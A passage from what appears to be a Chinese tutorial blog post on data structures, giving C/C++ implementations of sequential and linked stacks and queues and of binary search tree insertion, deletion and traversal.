<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ClearStack</span><span class="params">(LinkStack *S)</span></span><br><span class="line">&#123; </span><br><span class="line">        LinkStack p,q;  <span class="comment">//双指针释放各个结点内存，直至整个链表为空</span></span><br><span class="line">        p=S-&gt;top;</span><br><span class="line">        <span class="keyword">while</span>(p)          </span><br><span class="line">        &#123;  </span><br><span class="line">                q=p;</span><br><span class="line">                p=p-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(q);</span><br><span class="line">        &#125; </span><br><span class="line">        S-&gt;count=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="栈的长度"><a href="#栈的长度" class="headerlink" title="栈的长度"></a>栈的长度</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序栈</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">StackLength</span><span class="params">(SqStack S)</span></span><br><span class="line">&#123; </span><br><span class="line">        <span class="keyword">return</span> S.top+<span class="number">1</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链栈</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">StackLength</span><span class="params">(LinkStack S)</span></span><br><span class="line">&#123; </span><br><span class="line">        <span class="keyword">return</span> S.count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="栈顶元素的值"><a href="#栈顶元素的值" class="headerlink" title="栈顶元素的值"></a>栈顶元素的值</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序栈</span></span><br><span class="line"><span class="comment">/* 若栈不空，则用e返回S的栈顶元素，并返回1；否则返回0 */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">GetTop</span><span class="params">(SqStack S,<span class="type">int</span> *e)</span> </span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (S.top==<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                *e=S.data[S.top];</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链栈</span></span><br><span class="line"><span class="comment">/* 若栈不空，则用e返回S的栈顶元素，并返回1；否则返回0 */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">GetTop</span><span class="params">(LinkStack S,<span class="type">int</span> *e)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (S.top==<span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                *e=S.top-&gt;data;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="栈的压入"><a href="#栈的压入" class="headerlink" title="栈的压入"></a>栈的压入</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序栈</span></span><br><span class="line"><span class="comment">/* 插入元素e为新的栈顶元素 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Push</span><span class="params">(SqStack *S,<span class="type">int</span> e)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(S-&gt;top == MAXSIZE <span class="number">-1</span>) <span class="comment">/* 栈满 */</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        S-&gt;top++;				<span class="comment">/* 栈顶指针增加一 */</span></span><br><span class="line">        S-&gt;data[S-&gt;top]=e;  <span class="comment">/* 将新插入元素赋值给栈顶空间 */</span></span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链栈</span></span><br><span class="line"><span class="comment">/* 插入元素e为新的栈顶元素 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Push</span><span class="params">(LinkStack *S,<span class="type">int</span> e)</span></span><br><span class="line">&#123;</span><br><span class="line">        LinkStack s=new stackNode; </span><br><span class="line">        s-&gt;data=e;       <span class="comment">//头插法</span></span><br><span class="line">        s-&gt;next=S-&gt;top;	<span class="comment">/* 把当前的栈顶元素赋给新结点的直接后继*/</span></span><br><span class="line">        S-&gt;top=s;         <span class="comment">/* 将新的结点s赋给栈顶指针 */</span></span><br><span class="line">        S-&gt;count++;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="栈的弹出"><a href="#栈的弹出" class="headerlink" title="栈的弹出"></a>栈的弹出</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序栈</span></span><br><span class="line"><span class="comment">/* 若栈不空，则删除S的栈顶元素，用e返回其值*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Pop</span><span class="params">(SqStack *S,SElemType *e)</span></span><br><span class="line">&#123; </span><br><span class="line">        <span class="keyword">if</span>(S-&gt;top==<span class="number">-1</span>)    </span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">0</span>);                       </span><br><span class="line">        *e=S-&gt;data[S-&gt;top];	<span class="comment">/* 将要删除的栈顶元素赋值给e */</span></span><br><span class="line">        S-&gt;top--;				<span class="comment">/* 栈顶指针减一 */</span></span><br><span class="line">      </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链栈</span></span><br><span class="line"><span class="comment">/* 若栈不空，则删除S的栈顶元素，用e返回其值，并返回OK；否则返回ERROR */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Pop</span><span class="params">(LinkStack *S,<span class="type">int</span> *e)</span></span><br><span class="line">&#123; </span><br><span class="line">        LinkStack p;</span><br><span class="line">        <span class="keyword">if</span>(S-&gt;count==<span class="number">0</span>)</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        *e=S-&gt;top-&gt;data;</span><br><span class="line">        p=S-&gt;top;					<span class="comment">/* 将栈顶结点赋值给p*/</span></span><br><span class="line">        S-&gt;top=S-&gt;top-&gt;next;    <span class="comment">/* 使得栈顶指针下移一位，指向后一结点*/</span></span><br><span class="line">        <span class="built_in">free</span>(p);                    <span class="comment">/* 释放结点p */</span>        </span><br><span class="line">        S-&gt;count--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="栈的遍历"><a href="#栈的遍历" class="headerlink" title="栈的遍历"></a>栈的遍历</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序栈</span></span><br><span class="line"><span class="comment">/* 从栈底到栈顶依次对栈中每个元素显示 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">StackTraverse</span><span class="params">(SqStack S)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=S.top)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,S.data[i++]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链栈</span></span><br><span class="line"><span class="comment">/* 从栈底到栈顶依次对栈中每个元素显示 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">StackTraverse</span><span class="params">(LinkStack S)</span></span><br><span class="line">&#123;</span><br><span class="line">        LinkStack p;</span><br><span class="line">        p=S.top;</span><br><span class="line">        <span class="keyword">while</span>(p)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,p-&gt;data);</span><br><span class="line">                p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>






<hr>
<h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><h4 id="队列的结构"><a href="#队列的结构" class="headerlink" title="队列的结构"></a>队列的结构</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序队列</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MAXSIZE];<span class="comment">//MAXSIZE为队列的空间</span></span><br><span class="line">	<span class="type">int</span> front;    	<span class="comment">/* 头指针 */</span></span><br><span class="line">	<span class="type">int</span> rear;		<span class="comment">/* 尾指针，若队列不空，指向队列尾元素的下一个位置 */</span></span><br><span class="line">&#125;SqQueue;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链式队列</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span>	/* 结点结构 */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="type">int</span> data;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;QNode,*SQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>			/* 队列的链表结构 */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   SQueue front,rear; <span class="comment">/* 队头、队尾指针 */</span></span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="队列的构造"><a href="#队列的构造" class="headerlink" title="队列的构造"></a>队列的构造</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序队列</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">InitQueue</span><span class="params">(SqQueue *Q)</span></span><br><span class="line">&#123;</span><br><span class="line">	Q-&gt;front=<span class="number">0</span>; </span><br><span class="line">	Q-&gt;rear=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链式队列</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue *Q)</span></span><br><span class="line">&#123; </span><br><span class="line">	Q-&gt;front=Q-&gt;rear=new QNode; <span class="comment">//动态分配空间</span></span><br><span class="line">	<span class="keyword">if</span>(!Q-&gt;front)             </span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	Q-&gt;front-&gt;next=<span class="literal">NULL</span>;       <span class="comment">//指向NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="队列的清空"><a href="#队列的清空" class="headerlink" title="队列的清空"></a>队列的清空</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序队列</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ClearQueue</span><span class="params">(SqQueue *Q)</span></span><br><span class="line">&#123;</span><br><span class="line">	Q-&gt;front=Q-&gt;rear=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链式队列</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ClearQueue</span><span class="params">(LinkQueue *Q)</span></span><br><span class="line">&#123;</span><br><span class="line">	SQueue p,q;</span><br><span class="line">	Q-&gt;rear=Q-&gt;front;     <span class="comment">//双指针释放各结点空间，直至链表为空</span></span><br><span class="line">	p=Q-&gt;front-&gt;next;</span><br><span class="line">	Q-&gt;front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">while</span>(p)</span><br><span class="line">	&#123;</span><br><span class="line">		 q=p;</span><br><span class="line">		 p=p-&gt;next;</span><br><span class="line">		 <span class="built_in">free</span>(q);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="队列的长度"><a href="#队列的长度" class="headerlink" title="队列的长度"></a>队列的长度</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序队列</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">QueueLength</span><span class="params">(SqQueue Q)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span>  (Q.rear-Q.front+MAXSIZE)%MAXSIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链式队列</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">QueueLength</span><span class="params">(LinkQueue Q)</span></span><br><span class="line">&#123; </span><br><span class="line">	<span class="type">int</span> i=<span class="number">0</span>;<span class="comment">//计数器</span></span><br><span class="line">	SQueue p;</span><br><span class="line">	p=Q.front; <span class="comment">//从头遍历</span></span><br><span class="line">	<span class="keyword">while</span>(Q.rear!=p)</span><br><span class="line">	&#123;</span><br><span class="line">		 i++;</span><br><span class="line">		 p=p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="队列的头元素"><a href="#队列的头元素" class="headerlink" title="队列的头元素"></a>队列的头元素</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序队列</span></span><br><span class="line"><span class="comment">//将头元素值存在e</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">GetHead</span><span class="params">(SqQueue Q,<span class="type">int</span> *e)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(Q.front==Q.rear) <span class="comment">/* 队列空 */</span></span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	*e=Q.data[Q.front];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链式队列</span></span><br><span class="line"><span class="comment">//将头元素值存在e</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">GetHead</span><span class="params">(LinkQueue Q,<span class="type">int</span> *e)</span></span><br><span class="line">&#123; </span><br><span class="line">	SQueue p;</span><br><span class="line">	<span class="keyword">if</span>(Q.front==Q.rear) <span class="comment">/* 队列空 */</span></span><br><span class="line">		<span class="keyword">return</span> ;        </span><br><span class="line">	p=Q.front-&gt;next;</span><br><span class="line">	*e=p-&gt;data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="队列的插入"><a href="#队列的插入" class="headerlink" title="队列的插入"></a>队列的插入</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序队列</span></span><br><span class="line"><span class="comment">/* 若队列未满，则插入元素e为Q新的队尾元素 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(SqQueue *Q,<span class="type">int</span> e)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> ((Q-&gt;rear+<span class="number">1</span>)%MAXSIZE == Q-&gt;front)	<span class="comment">/* 队列满的判断 */</span></span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	Q-&gt;data[Q-&gt;rear]=e;			<span class="comment">/* 将元素e赋值给队尾 */</span></span><br><span class="line">	Q-&gt;rear=(Q-&gt;rear+<span class="number">1</span>)%MAXSIZE;<span class="comment">/* rear指针向后移一位置， */</span></span><br><span class="line">								<span class="comment">/* 若到最后则转到数组头部 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链式队列</span></span><br><span class="line"><span class="comment">/* 若队列未满，则插入元素e为Q新的队尾元素 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue *Q,<span class="type">int</span> e)</span></span><br><span class="line">&#123; </span><br><span class="line">	SQueue s=new QNode;</span><br><span class="line">	<span class="keyword">if</span>(!s) <span class="comment">/* 存储分配失败 */</span></span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	s-&gt;data=e;</span><br><span class="line">	s-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	Q-&gt;rear-&gt;next=s;	<span class="comment">/* 把拥有元素e的新结点s赋值给原队尾结点的后继*/</span></span><br><span class="line">	Q-&gt;rear=s;		<span class="comment">/* 把当前的s设置为队尾结点，rear指向s*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="队列的删除"><a href="#队列的删除" class="headerlink" title="队列的删除"></a>队列的删除</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序队列</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeQueue</span><span class="params">(SqQueue *Q,<span class="type">int</span> *e)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (Q-&gt;front == Q-&gt;rear)			<span class="comment">/* 队列空的判断 */</span></span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	*e=Q-&gt;data[Q-&gt;front];				<span class="comment">/* 将队头元素赋值给e */</span></span><br><span class="line">	Q-&gt;front=(Q-&gt;front+<span class="number">1</span>)%MAXSIZE;	<span class="comment">/* front指针向后移一位置， */</span></span><br><span class="line">									<span class="comment">/* 若到最后则转到数组头部 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链式队列</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeQueue</span><span class="params">(LinkQueue *Q,<span class="type">int</span> *e)</span></span><br><span class="line">&#123;</span><br><span class="line">	SQueue p;</span><br><span class="line">	<span class="keyword">if</span>(Q-&gt;front==Q-&gt;rear)</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	p=Q-&gt;front-&gt;next;		<span class="comment">/* 将欲删除的队头结点暂存给p**/</span></span><br><span class="line">	*e=p-&gt;data;				<span class="comment">/* 将欲删除的队头结点的值赋值给e */</span></span><br><span class="line">	Q-&gt;front-&gt;next=p-&gt;next;<span class="comment">/* 将原队头结点的后继p-&gt;next赋值给头结点后继*/</span></span><br><span class="line">	<span class="keyword">if</span>(Q-&gt;rear==p)		<span class="comment">/* 若队头就是队尾，则删除后将rear指向头结点*/</span></span><br><span class="line">		Q-&gt;rear=Q-&gt;front;</span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="队列的遍历"><a href="#队列的遍历" class="headerlink" title="队列的遍历"></a>队列的遍历</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序队列</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">QueueTraverse</span><span class="params">(SqQueue Q)</span></span><br><span class="line">&#123; </span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	i=Q.front;</span><br><span class="line">	<span class="keyword">while</span>((i+Q.front)!=Q.rear)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,Q.data[i]);</span><br><span class="line">		i=(i+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//链式队列</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">QueueTraverse</span><span class="params">(LinkQueue Q)</span></span><br><span class="line">&#123;</span><br><span class="line">	SQueue p;</span><br><span class="line">	p=Q.front-&gt;next;</span><br><span class="line">	<span class="keyword">while</span>(p)</span><br><span class="line">	&#123;</span><br><span class="line">		 <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,p-&gt;data);</span><br><span class="line">		 p=p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="树"><a href="#树" class="headerlink" title="树"></a>树</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h4 id="树的结构"><a href="#树的结构" class="headerlink" title="树的结构"></a>树的结构</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">node</span>* <span class="title">left</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">node</span>* <span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义一个栈结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">char</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span>*<span class="title">lchild</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span>*<span class="title">rchild</span>;</span></span><br><span class="line">&#125;BTnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Ware</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">data</span>[<span class="title">MAXSIZE</span>];</span></span><br><span class="line">	<span class="type">int</span> top;</span><br><span class="line">&#125;ware;</span><br></pre></td></tr></table></figure>

<h4 id="二叉树的构建"><a href="#二叉树的构建" class="headerlink" title="二叉树的构建"></a>二叉树的构建</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">node* <span class="title function_">binaryTreeCreatNode</span><span class="params">(node* head ,<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		node* p = new node;</span><br><span class="line">		p-&gt;data = val;</span><br><span class="line">		p-&gt;left = p-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span> p;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (head-&gt;data &gt; val) head-&gt;left = binaryTreeCreatNode(head-&gt;left, val);</span><br><span class="line">	<span class="keyword">if</span> (head-&gt;data &lt; val) head-&gt;right = binaryTreeCreatNode(head-&gt;right, val);</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node* <span class="title function_">binaryTreeCreat</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> N;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;N);</span><br><span class="line">	node* head = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> x;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">		head = binaryTreeCreatNode(head,x);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="二叉树的删除"><a href="#二叉树的删除" class="headerlink" title="二叉树的删除"></a>二叉树的删除</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">node* <span class="title function_">binaryTreeFindMin</span><span class="params">(node* head)</span></span><br><span class="line">&#123;</span><br><span class="line">	node* p = head;</span><br><span class="line">	<span class="keyword">while</span> (p-&gt;left != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		p = p-&gt;left;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node* <span class="title function_">binaryTreeDelete</span><span class="params">(node* head, <span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (head == <span class="literal">NULL</span>) <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;删除元素找不到&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (head-&gt;data &gt; x)</span><br><span class="line">        head-&gt;left = binaryTreeDelete(head-&gt;left, x);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(head-&gt;data &lt; x)</span><br><span class="line">        head-&gt;right = binaryTreeDelete(head-&gt;right, x);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (head-&gt;left != <span class="literal">NULL</span> &amp;&amp; head-&gt;right != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			node*temp = binaryTreeFindMin(head-&gt;right);</span><br><span class="line">			head-&gt;data = temp-&gt;data;</span><br><span class="line">			head-&gt;right = binaryTreeDelete(head-&gt;right, head-&gt;data);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			node* p = head;</span><br><span class="line">			<span class="keyword">if</span> (head-&gt;left != <span class="literal">NULL</span>) head = head-&gt;left;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (head-&gt;right != <span class="literal">NULL</span>)head = head-&gt;right;</span><br><span class="line">			<span class="keyword">else</span> head = <span class="literal">NULL</span>;</span><br><span class="line">			<span class="built_in">free</span>(p);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="树的遍历"><a href="#树的遍历" class="headerlink" title="树的遍历"></a>树的遍历</h4><h5 id="前序遍历"><a href="#前序遍历" class="headerlink" title="前序遍历"></a>前序遍历</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">binaryTreePreorderTraversal</span><span class="params">(node* head)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (head == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, head-&gt;data);<span class="comment">//这一行在前面就是前序遍历</span></span><br><span class="line">		binaryTreePrint(head-&gt;left);</span><br><span class="line">		binaryTreePrint(head-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrderTraverse</span><span class="params">(ware*S,BTnode*rootNode)</span></span><br><span class="line">&#123;</span><br><span class="line">	initWare(S); </span><br><span class="line">	push(S,rootNode);</span><br><span class="line">	<span class="keyword">while</span>(S-&gt;top!=<span class="number">-1</span>)      <span class="comment">//栈不为空</span></span><br><span class="line">	&#123;</span><br><span class="line">		BTnode*p=S-&gt;data[S-&gt;top];        <span class="comment">//取栈顶元素</span></span><br><span class="line">		pop(S);                          <span class="comment">//弹出</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p-&gt;data);</span><br><span class="line">		<span class="keyword">if</span>(p-&gt;rchild)	push(S,p-&gt;rchild);<span class="comment">//右子树存在，压入</span></span><br><span class="line">		<span class="keyword">if</span>(p-&gt;lchild)	push(S,p-&gt;lchild);<span class="comment">//左字树存在，压入</span></span><br><span class="line">	&#125;		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">binaryTreeInorderTraversal</span><span class="params">(node* head)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (head == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		binaryTreePrint(head-&gt;left);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, head-&gt;data);<span class="comment">//这一行在中间就是中序遍历</span></span><br><span class="line">		binaryTreePrint(head-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

